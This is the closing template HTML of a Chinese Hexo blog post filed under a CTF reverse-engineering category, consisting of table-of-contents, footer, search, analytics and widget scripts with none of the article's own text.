                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF-Reverse/">
                        <span class="chip bg-color">CTF-Reverse</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('4'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>



    <footer class="page-footer bg-color">
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2020</span>
            <a href="https://jackhcc.github.io" target="_blank">杰克成</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">3591.2k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2020";
                    var startMonth = "2";
                    var startDate = "27";
                    var startHour = "6";
                    var startMinute = "30";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/JackHCC" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:jackcc0701@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>



    <a href="https://www.facebook.com/profile.php?id=100046343443643" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=100046343443643" data-position="top" data-delay="50">
        <i class="fab fa-facebook-f"></i>
    </a>



    <a href="https://twitter.com/JackChe66021834" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/JackChe66021834" data-position="top" data-delay="50">
        <i class="fab fa-twitter"></i>
    </a>



    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2508074836" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2508074836" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>



    <a href="https://weibo.com/u/6885584679" class="tooltipped" target="_blank" data-tooltip="关注我的微博: https://weibo.com/u/6885584679" data-position="top" data-delay="50">
        <i class="fab fa-weibo"></i>
    </a>



    <a href="https://www.zhihu.com/people/8f8482f01f0d6a04e844efe32e0f0710" class="tooltipped" target="_blank" data-tooltip="关注我的知乎: https://www.zhihu.com/people/8f8482f01f0d6a04e844efe32e0f0710" data-position="top" data-delay="50">
        <i class="fab fa-zhihu1">知</i>
    </a>



</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/js/matery.js"></script>

    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas>
    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
    <script type="text/javascript" src="/js/fireworks.js"></script>

    <script type="text/javascript">
        //只在桌面版网页启用特效
        var windowWidth = $(window).width();
        if (windowWidth > 768) {
            document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>'); }
    </script>

    <!-- weather -->
	<script type="text/javascript">
	WIDGET = {FID: 'TToslpmkVO'}
	</script>
	<script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script>


    <!-- Global site tag (gtag.js) - Google Analytics -->


    <!-- Baidu Analytics -->

<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    <!-- Baidu Push -->

    
    
    <script async src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/others/busuanzi.pure.mini.js"></script>
    

    
        <script src="//code.tidio.co/kqhlkxviiccyoa0czpfpu4ijuey9hfre.js"></script>
        <script> 
            $(document).ready(function () {
                setInterval(change_Tidio, 50);  
                function change_Tidio() { 
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";   
                        document.getElementById("tidio-chat-iframe").style.right="-15px";   
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    } 
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;   
                        document.getElementById("tidio-chat-iframe").style.right="-15px"; 
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;   
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                } 
            }); 
        </script>
    

    

    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.7'
        zIndex="-1" count="99"
        src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/background/canvas-nest.js"></script>
    

    

    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/background/ribbon-dynamic.js" async="async"></script>
    
    
    
    <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/instantpage/instantpage.js" type="module"></script>
    

        <script src="//cdn.jsdelivr.net/npm/js-base64/base64.min.js"></script>
        <script>
        $('a').each(function() {
          const $this = $(this);
          const href = $this.attr('href');
          if (href && href.match('^((http|https|thunder|qqdl|ed2k|Flashget|qbrowser|ftp|rtsp|mms)://)')) {
            const strs = href.split('/');
            if (strs.length >= 3) {
                const host = strs[2];
                if (host !== 'your_domain' || window.location.host) {
                    $this.attr('href', '/go.html?u='+Base64.encode(href)+'').attr('rel', 'external nofollow noopener noreferrer');
                    if (true) {
                        $this.attr('target', '_blank');
                    }
                }
            }
          }
        });
        </script><script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>

</html>

